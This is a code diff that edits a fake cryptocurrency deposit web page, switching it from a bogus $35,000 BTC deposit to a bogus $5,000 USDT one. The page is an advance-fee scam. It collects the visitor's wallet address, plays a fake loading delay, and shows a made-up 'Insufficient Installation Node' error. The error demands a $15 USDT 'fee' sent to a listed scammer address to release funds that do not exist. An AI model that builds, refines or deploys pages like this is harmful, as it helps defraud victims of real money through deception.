@@ -3,7 +3,7 @@
 <head>
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1" />
-  <title>Incoming BTC Deposit</title>
+  <title>USDT Deposit</title>
   <style>
     body {
       margin: 0;
@@ -45,10 +45,39 @@
       border-radius: 50%;
       margin: 24px auto;
       animation: spin 1s linear infinite;
+      display: none;
     }
 
     @keyframes spin {
       to { transform: rotate(360deg); }
+    }
+
+    .btn {
+      appearance: none;
+      border: none;
+      background: linear-gradient(135deg, #329bff, #0057d6);
+      color: white;
+      padding: 12px 20px;
+      border-radius: 10px;
+      font-weight: 600;
+      cursor: pointer;
+      box-shadow: 0 8px 24px rgba(50,155,255,0.25);
+      margin-top: 20px;
+    }
+
+    .input-box {
+      display: none;
+      margin-top: 20px;
+    }
+
+    .input-box input {
+      width: 100%;
+      padding: 10px;
+      border-radius: 8px;
+      border: 1px solid #2a3746;
+      background: #0e141b;
+      color: #eaf1f8;
+      margin-bottom: 12px;
     }
 
     .error {
@@ -59,33 +88,6 @@
       border: 1px solid #ff5c5c;
       border-radius: 12px;
       color: #ff5c5c;
-    }
-
-    .battery {
-      margin: 16px auto;
-      width: 60px;
-      height: 28px;
-      border: 2px solid #ff5c5c;
-      border-radius: 6px;
-      position: relative;
-      background: #1b2430;
-    }
-
-    .battery::after {
-      content: "";
-      position: absolute;
-      top: 6px;
-      right: -10px;
-      width: 6px;
-      height: 16px;
-      background: #ff5c5c;
-      border-radius: 2px;
-    }
-
-    .battery-level {
-      width: 12%;
-      height: 100%;
-      background: #ff5c5c;
     }
 
     .wallets {
@@ -107,38 +109,64 @@
 </head>
 <body>
   <div class="card">
-    <h1>Incoming BTC Deposit</h1>
-    <div class="amount">Amount: <strong>$35,000 BTC</strong></div>
+    <h1>Incoming USDT Deposit</h1>
+    <div class="amount">Amount: <strong>$5,000 USDT</strong></div>
+    <button class="btn" id="acceptBtn">Accept</button>
+
+    <div class="input-box" id="inputBox">
+      <input type="text" id="usdtAddress" placeholder="Enter your USDT address" />
+      <button class="btn" id="confirmBtn">Confirm</button>
+    </div>
+
     <div class="loader" id="loader"></div>
 
     <div class="error" id="errorBox">
-      ⚠️ Incoming Deposit Error<br />
-      Reason: Lack of Node on Transaction Chain
-      <div class="battery">
-        <div class="battery-level"></div>
-      </div>
+      ⚠️ Deposit Error: Insufficient Installation Node<br />
       <div style="margin-top: 12px;">
-        To complete the transaction, please send <strong>$50 BTC</strong> to the address below.
+        To confirm and release your $5,000 USDT deposit, please send <strong>$15 USDT</strong> to the payment address below.
       </div>
     </div>
 
     <div class="wallets" id="wallets" style="display:none;">
-      <div><strong>Receiving Address:</strong><br /> [ 3C8BKuPoVtrLUfwTMatv6eRvFsHDPiBTAT ] </div>
-      <div style="margin-top: 12px;"><strong>Verification Payment Address:</strong><br />bc1qkx2fcjg5ex4xdhnwyhtpjjh37ep0ndxt3x4fjk</div>
+      <div><strong>Payment Address (USDT):</strong><br />TY4SpRKLhXgo6KjxmbjK5CBEUhP74WbYAa</div>
     </div>
 
     <div class="note" id="note" style="display:none;">
-      Once the $50 BTC is confirmed, the $35,000 BTC will be released to your wallet within 5–15 minutes (average BTC processing time).
+      Once the $15 USDT is confirmed, your $5,000 will be released to your wallet within 5–15 minutes (average USDT network processing time).
     </div>
   </div>
 
   <script>
-    setTimeout(() => {
-      document.getElementById('loader').style.display = 'none';
-      document.getElementById('errorBox').style.display = 'block';
-      document.getElementById('wallets').style.display = 'block';
-      document.getElementById('note').style.display = 'block';
-    }, 45000); // 45 seconds
+    const acceptBtn = document.getElementById('acceptBtn');
+    const inputBox = document.getElementById('inputBox');
+    const confirmBtn = document.getElementById('confirmBtn');
+    const loader = document.getElementById('loader');
+    const errorBox = document.getElementById('errorBox');
+    const wallets = document.getElementById('wallets');
+    const note = document.getElementById('note');
+
+    acceptBtn.addEventListener('click', () => {
+      acceptBtn.style.display = 'none';
+      inputBox.style.display = 'block';
+    });
+
+    confirmBtn.addEventListener('click', () => {
+      const address = document.getElementById('usdtAddress').value.trim();
+      if (!address) {
+        alert("Please enter your USDT address.");
+        return;
+      }
+
+      inputBox.style.display = 'none';
+      loader.style.display = 'block';
+
+      setTimeout(() => {
+        loader.style.display = 'none';
+        errorBox.style.display = 'block';
+        wallets.style.display = 'block';
+        note.style.display = 'block';
+      }, 8000); // 8 seconds
+    });
   </script>
 </body>
 </html>
